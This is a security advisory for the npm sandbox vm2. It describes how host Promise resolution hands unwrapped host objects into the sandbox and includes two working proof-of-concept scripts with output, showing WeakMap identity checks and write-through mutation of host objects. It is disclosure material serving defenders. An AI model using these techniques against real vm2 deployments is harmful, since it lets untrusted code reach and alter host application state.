# [M] vm2 Host Promise Resolution Preserves Object Identity Across Sandbox Boundary

## Summary
Severity: Medium
Advisory: GHSA-mpf8-4hx2-7cjg
CVE: CVE-2026-44000
CWE: CWE-668, CWE-693
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-mpf8-4hx2-7cjg
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
### Summary

A sandbox boundary violation in **vm2** allows host object identity to cross into the sandbox through host Promise resolution.

When a host-side Promise that resolves to a host object is exposed to the sandbox, the value delivered to the sandbox `.then()` callback preserves host identity. This allows the sandbox to interact with the host object directly, including:

- Performing identity checks using host-side `WeakMap`
- Mutating host object state from inside the sandbox

This behavior occurs because the Promise fulfillment wrapper uses `ensureThis()` instead of the stronger cross-realm conversion path (`from()` / proxy wrapping). If no prototype mapping is found, `ensureThis()` returns the original object.

As a result, objects resolved by host Promises can cross the sandbox boundary without proper isolation.

---

### Details

In `setup-sandbox.js`, vm2 wraps `Promise.prototype.then`:

```js
globalPromise.prototype.then = function then(onFulfilled, onRejected) {
  resetPromiseSpecies(this);

  if (typeof onFulfilled === 'function') {
    const origOnFulfilled = onFulfilled;
    onFulfilled = function onFulfilled(value) {
      value = ensureThis(value);
      return apply(origOnFulfilled, this, [value]);
    };
  }

  return apply(globalPromiseThen, this, [onFulfilled, onRejected]);
};


The wrapper calls ensureThis(value) before invoking the sandbox callback.

However, ensureThis is implemented in bridge.js as thisEnsureThis():

function thisEnsureThis(other) {
  const type = typeof other;

  switch (type) {
    case 'object':
      if (other === null) return null;

    case 'function':
      let proto = thisReflectGetPrototypeOf(other);

      if (!proto) {
        return other;
      }

      while (proto) {
        const mapping = thisReflectApply(thisMapGet, protoMappings, [proto]);

        if (mapping) {
          const mapped = thisReflectApply(thisWeakMapGet, mappingOtherToThis, [other]);
          if (mapped) return mapped;
          return mapping(defaultFactory, other);
        }

        proto = thisReflectGetPrototypeOf(proto);
      }

      return other;

If no prototype mapping is found, ensureThis() simply returns the original object:

return other;

This means the sandbox receives the original host object instead of a proxied or sanitized representation.

Because of this behavior, values resolved by host Promises can cross the host–sandbox boundary with identity preserved.

PoC

The following Proof of Concept demonstrates that an object resolved by a host Promise can be used as a valid key in a host-side WeakMap from inside the sandbox.

WeakMap keys rely on reference identity, so a successful lookup proves that the sandbox received the host object identity.

PoC Code
import {VM} from "./index.js";

const hostObj = {tag: "HOST_OBJ"};
const hostPromise = Promise.resolve(hostObj);

// WeakMap created on the host
const wm = new WeakMap([[hostObj, "HIT"]]);

const vm = new VM({
  sandbox: {hostPromise, wm},
  timeout: 1000,
  eval: false,
  wasm: false,
});

const code = `
  hostPromise.then(v => ({
    weakMapGet: wm.get(v),
    typeofV: typeof v,
    tag: v.tag
  }))
`;

const result = await vm.run(code);

console.log("VM RESULT:", result);
console.log("HOST SAME KEY STILL:", wm.get(hostObj));
Output
VM RESULT: { weakMapGet: 'HIT', typeofV: 'object', tag: 'HOST_OBJ' }
HOST SAME KEY STILL: HIT

This confirms that the object delivered to the sandbox callback retains host identity.

Additional Demonstration: Host Object Mutation

The sandbox can also mutate host object state through the resolved Promise value.

import {VM} from "./index.js";

const hostObj = {tag: "HOST_OBJ", nested: {x: 1}};
const hostPromise = Promise.resolve(hostObj);

const vm = new VM({
  sandbox: {hostPromise},
  timeout: 1000,
  eval: false,
  wasm: false,
});

const code = `
  hostPromise.then(v => {
    v.nested.x = 999;
    v.tag = "MUTATED";
    return { seenTag: v.tag, seenX: v.nested.x };
  })
`;

const result = await vm.run(code);

console.log("VM RESULT:", result);
console.log("HOST AFTER:", hostObj);

**Output:**
VM RESULT: { seenTag: 'MUTATED', seenX: 999 }
HOST AFTER: { tag: 'MUTATED', nested: { x: 999 } }

This demonstrates write-through mutation of a host object from sandbox code.

**Impact**
This vulnerability allows host object references to cross the vm2 sandbox boundary via Promise resolution.

Consequences include:

Host object identity disclosure

Write-through mutation of host objects

WeakMap / WeakSet identity oracle across the boundary

Potential capability leaks if sensitive host objects are reachable via Promises

Applications that expose host Promises to sandboxed code may unintentionally grant the sandbox direct access to host objects.

This weakens the intended isolation guarantees of vm2.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-mpf8-4hx2-7cjg
- https://nvd.nist.gov/vuln/detail/CVE-2026-44000
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
